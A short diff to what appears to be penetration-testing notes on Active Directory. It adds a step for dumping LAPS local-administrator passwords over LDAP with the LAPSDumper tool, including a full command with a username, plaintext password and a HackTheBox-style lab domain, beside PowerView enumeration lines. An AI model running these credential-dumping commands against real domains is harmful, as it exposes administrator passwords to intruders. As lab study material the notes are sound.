@@ -289,6 +289,14 @@ Find-LAPSDelegatedGroups
 Get-NetGroupMember -GroupName "XXX"
 ```
 
+If unable to get a shell as the user that's able to read LAPS passwords, then use LDAP to obtain the LAPS passwords ([https://github.com/n00py/LAPSDumper](https://github.com/n00py/LAPSDumper)):
+
+```bash
+python3 laps.py -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -d streamio.htb
+```
+
+<figure><img src="../.gitbook/assets/image (361).png" alt=""><figcaption></figcaption></figure>
+
 </details>
 
 <details>
